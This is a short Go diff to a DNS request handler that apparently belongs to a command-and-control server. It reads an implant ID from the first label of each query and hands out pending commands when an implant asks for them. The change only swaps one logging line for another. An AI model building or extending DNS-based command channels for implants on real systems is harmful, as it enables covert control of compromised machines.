@@ -60,6 +60,7 @@ func NewDNSHandler() *DNSHandler {
 func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 	q := req.Question[0]
 	normalizedQName := strings.ToLower(q.Name) // add a comment here
+	log.Printf("Query %s\n", normalizedQName)
 	labels := dns.SplitDomainName(normalizedQName)
 	implantID := labels[0]
 
@@ -86,7 +87,6 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 
 		// domainLabels := strings.Split(questionName, ".")
 
-		log.Println(q.Name)
 		switch labels[1] {
 		case "cmd": // implant is requesting command
 			if pendingCmds, ok := h.commands[implantID]; ok {
